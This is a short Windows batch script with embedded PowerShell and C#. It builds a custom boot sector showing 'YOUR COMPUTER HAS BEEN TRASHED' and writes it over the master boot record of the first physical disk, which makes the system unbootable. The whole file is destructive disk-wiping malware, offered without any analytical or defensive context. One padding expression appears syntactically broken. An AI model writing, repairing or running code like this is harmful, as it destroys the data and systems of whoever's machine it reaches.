@echo off
powershell -NoProfile -Command ^
"$m='YOUR COMPUTER HAS BEEN TRASHED';^
[byte[]]$h=0xB8,0x0E,0x00,0x8E,0xD8,0xBE,0x1F,0x7C,0xB4,0x0E,0xAC,0x3C,0x00,0x74,0x0A,0xCD,0x10,0xEB,0xF5,0xF4;^
$b=[System.Text.Encoding]::ASCII.GetBytes($m)+0;^
$p=510-$h.Length-$b.Length;^
if($p -lt 0){Write-Error 'Too long';exit};^
$d=$h+$b+( *$p)+0x55,0xAA;^
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
public class RawDiskAccess {
[DllImport(\"kernel32.dll\", SetLastError=true, CharSet=CharSet.Auto)]
public static extern SafeFileHandle CreateFile(string n, uint a, uint s, IntPtr sa, uint c, uint f, IntPtr t);
[DllImport(\"kernel32.dll\", SetLastError=true)]
public static extern bool WriteFile(SafeFileHandle h, byte[] b, uint l, out uint w, IntPtr o);
public const uint GENERIC_WRITE=0x40000000,OPEN_EXISTING=3,FILE_SHARE_READ=1,FILE_SHARE_WRITE=2;
public static void WriteMBR(byte[] d){
if(d.Length!=512)throw new ArgumentException();
var h=CreateFile(\"\\\\\\\\.\\\\PhysicalDrive0\",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,IntPtr.Zero,OPEN_EXISTING,0,IntPtr.Zero);
if(h.IsInvalid)throw new IOException();
if(!WriteFile(h,d,512,out uint w,IntPtr.Zero)||w!=512)throw new IOException();
h.Close();}}'@;^
[RawDiskAccess]::WriteMBR($d)"

